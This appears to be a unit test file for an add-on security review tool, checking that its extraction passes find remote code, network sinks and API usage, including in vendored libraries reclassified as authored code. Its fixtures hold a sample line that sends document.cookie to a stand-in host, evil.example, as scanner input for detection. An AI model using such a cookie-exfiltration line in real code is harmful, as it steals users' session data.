// Unit tests for the extraction passes and their accessors: a pass produces, per source on
// src.extracted, the SAME per-file results a direct scanner call would (so migrating a
// consumer to the precomputed field cannot change a finding), gates content extraction on
// authored-ness, and retains no AST. runShippedExtractionPass is the light variant for the
// SHIPPED XPI in an SCA review - the load graph alone. The xOf() accessors are PURE READS:
// they throw on a source no pass ever ran on, because a check never parses.

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  networkSinksOf,
  apiUsageOf,
  runExtractionPass,
  runShippedExtractionPass,
  remoteJsOf,
  moduleSyntaxOf,
} from "../../src/checks/extract.js";
import { scanRemoteJs } from "../../src/parse/remote-js.js";
import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
import { scanCoreSymbols } from "../../src/parse/core-symbols.js";
import { parseApiUsage } from "../../src/parse/api-usage.js";
import {
  classifyFiles,
  assembleBundled,
  applyNotPopularVendor,
} from "../../src/lib/bundled.js";
import { collectJsSources } from "../../src/addon/sources.js";

const src = (file, code) => ({ file, code, lineOffset: 0, inline: false });

const RICH =
  'eval(x); fetch("https://evil.example/" + document.cookie); ' +
  "Services.wm.get(); browser.tabs.query({});";

test("populates src.extracted with results equal to a direct scanner call", () => {
  const sources = [src("app.js", RICH)];
  runExtractionPass(sources);
  const { extracted } = sources[0];
  assert.deepEqual(extracted.remoteJs.hits, scanRemoteJs(RICH, 0).hits);
  assert.deepEqual(extracted.networkSinks.hits, scanNetworkSinks(RICH, 0).hits);
  assert.deepEqual(extracted.coreSymbols.hits, scanCoreSymbols(RICH, 0).hits);
  assert.deepEqual(extracted.apiUsage.usages, parseApiUsage(RICH, 0).usages);
  assert.equal(extracted.apiUsage.parseError, null);
  // Only summaries are retained - never the AST.
  assert.equal(sources[0].parsed, undefined);
  assert.ok(!("ast" in extracted));
});

test("skips content extraction for a non-authored file", () => {
  const sources = [src("vendor/lib.js", RICH)];
  runExtractionPass(sources, { nonAuthored: new Set(["vendor/lib.js"]) });
  const { extracted } = sources[0];
  assert.equal(
    extracted.remoteJs,
    undefined,
    "no content scan on a non-authored file"
  );
  assert.equal(extracted.networkSinks, undefined);
  assert.ok(extracted.apiUsage, "api-usage still runs on every file");
  assert.ok(extracted.localImports, "load-graph refs run on every file");
});

test("results still match a direct scan for pathological input", () => {
  const code = "function(){"; // incomplete - exercises the parse-error path
  const sources = [src("weird.js", code)];
  runExtractionPass(sources);
  assert.deepEqual(
    sources[0].extracted.remoteJs.hits,
    scanRemoteJs(code, 0).hits
  );
});

// A CHECK IS A PURE READER: the accessors return what a pass precomputed, and NEVER parse.
// A source that reaches one without having been through a pass is a wiring bug in setup -
// parsing it here would put an AST in the check's call stack, and (far worse) an accessor
// that quietly recomputes cannot tell "setup forgot this artifact" from "there is nothing
// here", so a whole artifact could go unreviewed with no symptom. Fail loudly instead.
test("accessors read the precomputed result, and throw when no pass ran", () => {
  const withPass = src("a.js", RICH);
  runExtractionPass([withPass]);
  assert.equal(remoteJsOf(withPass), withPass.extracted.remoteJs);

  const noPass = src("b.js", RICH);
  assert.throws(
    () => remoteJsOf(noPass),
    /read before the extraction pass ran/
  );
});

test("records module-syntax loc + moduleSyntaxOf reads it", () => {
  const mod = src("mod.js", "import x from './y.js'; x();");
  const classic = src("classic.js", "var x = 1; x();");
  runExtractionPass([mod, classic]);
  assert.ok(mod.extracted.moduleSyntaxLoc, "import loc recorded on the pass");
  assert.equal(
    classic.extracted.moduleSyntaxLoc,
    null,
    "no module syntax -> null (not undefined)"
  );
  assert.equal(moduleSyntaxOf(mod), mod.extracted.moduleSyntaxLoc);
});

// The LIGHT pass, for the SHIPPED XPI in an SCA review: the built add-on is only ever
// walked as a load graph there, so that is all it extracts. The two input:xpi module checks
// read moduleSyntaxOf off it, and reachability reads the refs - no content scanner and no
// api-usage consumer ever reads this artifact.
test("the shipped pass extracts the load graph, and no content", () => {
  const shipped = src("bundle.js", RICH);
  runShippedExtractionPass([shipped]);

  assert.ok(shipped.extracted.localImports, "local imports extracted");
  assert.ok(shipped.extracted.loaderRefs, "loader refs extracted");
  assert.equal(moduleSyntaxOf(shipped), shipped.extracted.moduleSyntaxLoc);

  // No content scanner ran, and no api-usage: the accessors read that absence, they do NOT
  // parse the bundle to fill it in.
  assert.equal(remoteJsOf(shipped), undefined);
  assert.equal(networkSinksOf(shipped), undefined);
  assert.equal(apiUsageOf(shipped), undefined);
});

test("extracts experimentRefs only when Experiment namespaces are supplied", () => {
  const code = 'browser.myapi.registerScript("exp/inject.js");';
  const withNs = src("bg.js", code);
  runExtractionPass([withNs], { experimentNamespaces: new Set(["myapi"]) });
  assert.ok(withNs.extracted.experimentRefs.refs.length, "refs extracted");
  const withoutNs = src("bg.js", code);
  runExtractionPass([withoutNs]);
  assert.equal(withoutNs.extracted.experimentRefs, undefined);
});

// The pipeline's Phase-3 ORDER is load-bearing, and this is why: identifyBundledLibraries
// FINALIZES the non-authored skip set, and it REMOVES as well as adds. applyNotPopularVendor
// drops a READABLE vendored library whose package turns out not to be popular, so the library
// is reviewed as the developer's OWN code. Run the extraction pass before that removal and the
// file ends up authored but never content-scanned - and since a check is a pure reader, it
// finds nothing there: the library's network sinks, eval and unsafe-HTML all become invisible,
// while every content consumer reads `undefined` and throws.
//
// The goldens cannot catch this: the harness injects an offline vendorNet, so isPopular never
// runs and no package is ever judged not-popular.
test("a vendored library dropped from the skip set is still content-scanned", () => {
  const code = 'fetch("https://evil.example/" + document.cookie);';
  const addon = {
    files: new Map([["lib/mylib.js", Buffer.from(code)]]),
    vendor: {
      set: new Set(["lib/mylib.js"]),
      folders: [],
      results: [
        {
          path: "lib/mylib.js",
          outcome: "not-popular",
          source: "https://npm/x",
        },
      ],
    },
  };

  // Phase 3, in the pipeline's order: classify -> identify (reconciles) -> parse.
  addon.bundled = assembleBundled(
    classifyFiles(addon, { libraryHashes: new Map() })
  );
  assert.ok(
    addon.bundled.nonAuthored.has("lib/mylib.js"),
    "declared vendored -> non-authored"
  );
  applyNotPopularVendor(addon);
  assert.ok(
    !addon.bundled.nonAuthored.has("lib/mylib.js"),
    "not-popular -> reviewed as authored code"
  );

  const jsSources = collectJsSources(addon);
  runExtractionPass(jsSources, { nonAuthored: addon.bundled.nonAuthored });

  // Reads `undefined` and throws if the pass ran against the pre-reconciliation skip set.
  const { hits } = networkSinksOf(jsSources[0]);
  assert.equal(
    hits.length,
    1,
    "the exfiltration in the now-authored library is seen"
  );
});
